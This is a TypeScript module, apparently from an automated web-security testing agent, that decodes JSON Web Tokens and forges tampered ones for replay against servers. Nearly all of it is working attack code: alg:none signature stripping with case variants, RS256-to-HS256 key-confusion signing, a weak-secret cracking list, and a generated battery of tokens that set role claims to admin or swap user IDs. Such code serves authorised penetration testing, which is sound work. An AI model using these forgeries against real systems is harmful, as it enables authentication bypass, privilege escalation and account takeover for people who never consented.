// Native JWT analysis + tamper engine (Web Workflow 2.0, plan §05 authn_test).
// Replaces the Python `attack_script jwt_tamper` with a pure, dependency-light TS
// module: no process spawn, no Python, fully unit-testable (all crypto is local —
// no network). The `authn_test` smart tool composes this and sends forged tokens
// through the http_replay engine; the crypto/judgment substrate lives here.
//
// FACTS + primitives, not verdicts: this mints candidate tokens and reports token
// structure/weaknesses; whether the server ACCEPTS a forged token is confirmed by
// the tool's replay step, then judged by the agent.
import { createHmac, timingSafeEqual } from "crypto"

export namespace Jwt {
  export interface Decoded {
    header: Record<string, unknown>
    payload: Record<string, unknown>
    signature: string // base64url, "" for alg:none
    signingInput: string // "<h>.<p>" — the bytes a signature covers
  }

  // ── base64url + JSON helpers ─────────────────────────────────────────────────
  function b64urlEncodeJson(obj: unknown): string {
    return Buffer.from(JSON.stringify(obj)).toString("base64url")
  }
  function b64urlDecodeJson(seg: string): Record<string, unknown> {
    const text = Buffer.from(seg, "base64url").toString("utf8")
    const v = JSON.parse(text)
    if (!v || typeof v !== "object" || Array.isArray(v)) throw new Error("segment is not a JSON object")
    return v as Record<string, unknown>
  }

  // ── decode ───────────────────────────────────────────────────────────────────
  /** Parse a JWT into its parts. Throws on a malformed token or non-JSON segments. */
  export function decode(token: string): Decoded {
    const parts = token.split(".")
    if (parts.length !== 3) throw new Error(`invalid JWT: expected 3 dot-separated parts, got ${parts.length}`)
    const header = b64urlDecodeJson(parts[0])
    const payload = b64urlDecodeJson(parts[1])
    return { header, payload, signature: parts[2], signingInput: `${parts[0]}.${parts[1]}` }
  }

  /** Non-throwing decode — returns an error object instead. */
  export function tryDecode(token: string): Decoded | { error: string } {
    try {
      return decode(token)
    } catch (e) {
      return { error: e instanceof Error ? e.message : String(e) }
    }
  }

  // ── encode / sign ────────────────────────────────────────────────────────────
  /** Forge an unsigned token (alg:none family). Header alg is forced to `algValue`
   *  (default "none"; pass "None"/"NONE" to probe case-sensitive verifier bypasses). */
  export function encodeNone(
    header: Record<string, unknown>,
    payload: Record<string, unknown>,
    algValue: "none" | "None" | "NONE" | "nOnE" = "none",
  ): string {
    const h = b64urlEncodeJson({ ...header, alg: algValue })
    const p = b64urlEncodeJson(payload)
    return `${h}.${p}.`
  }

  /** HMAC-SHA256 sign. Used for legit re-sign (known secret), weak-secret confirmation,
   *  and the RS256→HS256 confusion attack (secret = the RSA PUBLIC key). */
  export function signHS256(header: Record<string, unknown>, payload: Record<string, unknown>, secret: string): string {
    const h = b64urlEncodeJson({ ...header, alg: "HS256" })
    const p = b64urlEncodeJson(payload)
    const sig = createHmac("sha256", secret).update(`${h}.${p}`).digest("base64url")
    return `${h}.${p}.${sig}`
  }

  // ── verify / crack (HS256 only — the crackable family) ───────────────────────
  /** Constant-time HS256 verification against a candidate secret. */
  export function verifyHS256(token: string, secret: string): boolean {
    const d = tryDecode(token)
    if ("error" in d) return false
    const alg = String(d.header.alg ?? "").toUpperCase()
    if (alg !== "HS256") return false
    const expected = createHmac("sha256", secret).update(d.signingInput).digest()
    let got: Buffer
    try {
      got = Buffer.from(d.signature, "base64url")
    } catch {
      return false
    }
    if (got.length !== expected.length) return false
    try {
      return timingSafeEqual(got, expected)
    } catch {
      return false
    }
  }

  /** Try each candidate secret against an HS256 token. Returns the first match or null. */
  export function crackHS256(token: string, secrets: readonly string[]): string | null {
    for (const s of secrets) if (verifyHS256(token, s)) return s
    return null
  }

  // A compact default weak-secret list (extend at the tool layer). Kept small and
  // well-known — the point is to catch a lazily-configured signer, not brute HMAC.
  export const WEAK_SECRETS: readonly string[] = [
    "secret",
    "password",
    "changeme",
    "jwt",
    "jwt_secret",
    "jwtsecret",
    "key",
    "private",
    "admin",
    "test",
    "1234",
    "12345678",
    "",
    "your-256-bit-secret",
    "your_jwt_secret",
    "supersecret",
    "s3cr3t",
  ]

  // ── attack primitives ────────────────────────────────────────────────────────
  /** alg:none forge, optionally applying payload/header overrides. */
  export function forgeAlgNone(
    token: string,
    opts: { setPayload?: Record<string, unknown>; setHeader?: Record<string, unknown>; algValue?: "none" | "None" | "NONE" | "nOnE" } = {},
  ): string {
    const d = decode(token)
    const header = { ...d.header, ...(opts.setHeader ?? {}) }
    const payload = { ...d.payload, ...(opts.setPayload ?? {}) }
    return encodeNone(header, payload, opts.algValue ?? "none")
  }

  /** RS256→HS256 algorithm-confusion: switch the header to HS256 and HMAC-sign with the
   *  RSA PUBLIC key as the secret. A server that verifies HS256 with its public key accepts it. */
  export function rs256ToHS256(token: string, publicKeyPem: string, setPayload?: Record<string, unknown>): string {
    const d = decode(token)
    const payload = { ...d.payload, ...(setPayload ?? {}) }
    return signHS256(d.header, payload, publicKeyPem)
  }

  /** General tamper: apply overrides, then re-emit. If `key` is given and the token is
   *  not alg:none, HS256-re-sign with it; otherwise forge alg:none (mirrors jwt_tamper). */
  export function tamper(
    token: string,
    opts: { setPayload?: Record<string, unknown>; setHeader?: Record<string, unknown>; key?: string },
  ): string {
    const d = decode(token)
    const header = { ...d.header, ...(opts.setHeader ?? {}) }
    const payload = { ...d.payload, ...(opts.setPayload ?? {}) }
    const alg = String(header.alg ?? "none").toLowerCase()
    if (opts.key && alg !== "none") return signHS256(header, payload, opts.key)
    return encodeNone(header, payload)
  }

  // ── analysis + escalation candidates ─────────────────────────────────────────
  const ROLE_KEYS = ["role", "roles", "is_admin", "isAdmin", "admin", "privilege", "group", "scope"]
  const UID_KEYS = ["sub", "user_id", "userId", "uid", "id", "account_id"]

  export interface Analysis {
    valid: boolean
    error?: string
    alg: string
    algNone: boolean // alg is a none-variant (case-insensitive) — signature bypass risk
    symmetric: boolean // HS* — crackable / confusion-prone
    headerInjection: string[] // kid / jku / x5u / x5c present — SSRF/keysubstitution vectors
    escalationClaims: string[] // role/privilege claims present in the payload
    idClaims: string[] // subject/user-id claims present (IDOR-via-token)
    expired?: boolean
    expNever?: boolean // exp missing or absurdly far → token effectively never expires
  }

  /** Structured weaknesses of a token — LEADS, not verdicts. */
  export function analyze(token: string, now: number = Date.now()): Analysis {
    const d = tryDecode(token)
    if ("error" in d) return { valid: false, error: d.error, alg: "", algNone: false, symmetric: false, headerInjection: [], escalationClaims: [], idClaims: [] }
    const alg = String(d.header.alg ?? "").trim()
    const headerInjection = ["kid", "jku", "x5u", "x5c"].filter((k) => k in d.header)
    const escalationClaims = ROLE_KEYS.filter((k) => k in d.payload)
    const idClaims = UID_KEYS.filter((k) => k in d.payload)
    const exp = typeof d.payload.exp === "number" ? d.payload.exp : undefined
    const analysis: Analysis = {
      valid: true,
      alg,
      algNone: alg.toLowerCase() === "none",
      symmetric: alg.toUpperCase().startsWith("HS"),
      headerInjection,
      escalationClaims,
      idClaims,
    }
    if (exp !== undefined) analysis.expired = exp * 1000 < now
    else analysis.expNever = true
    return analysis
  }

  export interface Candidate {
    name: string
    token: string
    note: string
  }

  /** Mint the standard forged-token battery for an endpoint: alg:none, role-escalation,
   *  and user-id swaps — mirroring jwt_tamper's set, as alg:none tokens the tool then replays. */
  export function escalationCandidates(token: string): Candidate[] {
    const d = tryDecode(token)
    if ("error" in d) return []
    const out: Candidate[] = []
    out.push({ name: "alg-none", token: encodeNone(d.header, d.payload), note: "signature stripped (alg:none)" })
    for (const k of ROLE_KEYS) {
      if (!(k in d.payload)) continue
      const value = k === "is_admin" || k === "isAdmin" ? true : "admin"
      out.push({ name: `${k}=${String(value)}`, token: encodeNone(d.header, { ...d.payload, [k]: value }), note: "privilege escalation via role claim" })
    }
    for (const k of UID_KEYS) {
      if (!(k in d.payload)) continue
      for (const v of ["1", "0", "admin"]) {
        out.push({ name: `${k}=${v}`, token: encodeNone(d.header, { ...d.payload, [k]: v }), note: "identity swap via subject claim" })
      }
      break // only the first id-like claim, like jwt_tamper
    }
    return out
  }
}
